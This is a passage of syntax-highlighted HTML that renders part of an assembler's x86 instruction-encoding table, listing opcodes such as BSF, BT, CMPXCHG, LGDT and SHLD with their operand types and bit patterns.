    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">BSF</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011110000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">BSR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011110100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LSL</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000001100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LAR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">AAD</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">AAM</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">BT</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011101000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">            </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010001100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">BTC</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011101000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011101100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">BTR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011101000110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011001100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">BTS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011101000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010101100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">CMPXCHG</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">XADD</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">SGDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">SIDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LGDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LIDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc5">CMPXCHG8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100011100001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">LFS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">            </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LGS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011010100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011010100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LSS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">LLDT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LMSW</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000100110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">LTR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">SHLD</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWIm8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">            </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWCl</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010010100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">SHRD</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWIm8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010110000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWCl</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010110100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

